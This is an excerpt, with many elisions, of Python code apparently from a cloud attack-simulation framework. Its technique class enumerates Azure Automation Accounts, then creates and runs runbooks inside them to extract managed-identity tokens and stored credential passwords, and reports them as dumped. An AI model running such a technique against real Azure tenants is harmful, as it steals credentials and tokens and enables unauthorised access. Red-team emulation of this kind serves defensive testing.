...
class AzureDumpAutomationAccounts(BaseTechnique):
    ...
    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        ...
        try:
            ...
            def create_and_run_runbook_direct(
                resource_group_name,
                auto_account_name,
                runbook_content,
                automation_client,
                ...
                try:
                    ...
                    print(
                        f"                Importing and running runbook {runbook_name}"
                    )
            ...
            def process_identities(
                ...
                runbook_content = "\n".join(script_lines)
                value_identities = create_and_run_runbook_direct(
                    resource_group_name,
                    auto_account_name,
                    runbook_content,
                    automation_client,
            ...
            def process_credentials(
                resource_group_name, auto_account_name, cred_names, automation_client
            ):
                """Retrieve credentials stored in an Automation Account"""
                script_lines = [
                    "$cred_names = @("
                    + ", ".join([f"'{cred_name}'" for cred_name in cred_names])
                    + ")",
                    "$result = @()",
                ...
                # Create and run the runbook
                runbook_content = "\n".join(script_lines)
                value_creds = create_and_run_runbook_direct(
                    resource_group_name,
                    auto_account_name,
                    runbook_content,
                    automation_client,
            ...
            for resource_group in resource_groups:
                ...
                print("    Getting Azure Automation Accounts")
                auto_accounts = (
                    automation_client.automation_account.list_by_resource_group(
                        resource_group_name
                    )
                )
                ...
                if not accounts_list:
                    print(
                        f"    No automation accounts found in resource group '{resource_group_name}'."
                    )
                    continue
                ...
                for auto_account in accounts_list:
                    ...
                    automation_account_info = automation_client.automation_account.get(
                        resource_group_name, auto_account_name
                    )
                    ...
                    identity_info = automation_account_info.additional_properties.get(
                        "identity", {}
                    )
                    ...
                    for identity_type in identity_types:
                        if identity_type == "UserAssigned":
                            user_assigned_clients = [
                                ...
                                for v in identity_info.get(
                                    "userAssignedIdentities", {}
                                ).values()
                            ]
                        if identity_type == "SystemAssigned":
                            system_assigned_principal_id = identity_info.get(
                                "principalId"
                            )
                    ...
                    if user_assigned_clients or system_assigned_principal_id:
                        ...
                        token_value = process_identities(
                            resource_group_name,
                            auto_account_name,
                            user_assigned_clients,
                            system_assigned_principal_id,
                    ...
                    auto_creds = (
                        automation_client.credential.list_by_automation_account(
                            resource_group_name, auto_account_name
                        )
                    )
                    ...
                    if creds_list:
                        ...
                        cred_values = process_credentials(
                            resource_group_name,
                            auto_account_name,
                            creds_list,
                            automation_client,
                        ...
                        try:
                            ...
                            if isinstance(cred_values_json, list):
                                ...
                                auto_account_data[auto_account_name][
                                    ...
                                    {
                                        "credential_name": cred_values_json[
                                            "credential_name"
                                        ],
                                        "credential_value": cred_values_json[
                                            "password"
                                        ],
                                    }
                                )
            ...
            return ExecutionStatus.SUCCESS, {
                "message": "Successfully dumped automation accounts",
